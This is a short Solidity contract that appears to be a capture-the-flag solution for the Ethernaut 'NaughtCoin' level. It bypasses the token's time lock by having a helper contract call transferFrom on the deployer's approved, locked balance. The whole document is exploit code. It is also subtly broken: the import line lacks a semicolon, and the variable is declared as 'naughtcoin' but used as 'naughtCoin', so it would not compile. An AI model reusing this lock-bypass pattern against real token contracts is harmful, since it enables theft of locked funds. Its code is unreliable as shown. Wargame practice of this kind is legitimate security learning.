//SPDX-License-Identifier: none
pragma solidity ^0.8.0;

import "./NaughtCoin.sol"

contract Naughty {

    NaughtCoin naughtcoin;
    address hacker;

    constructor(address $your_ethernaut_instance_here) {
        naughtCoin = NaughtCoin($your_ethernaut_instance_here);
        hacker = msg.sender;
    }

    // this function assumes the hacker/deployer of this contract has already called approve for their vested/locked tokens on the target contract
    function naughtyConsent() public {
        uint amount = naughtCoin.balanceOf(hacker);
        naughtCoin.transferFrom(hacker, address(this), amount);
    }
}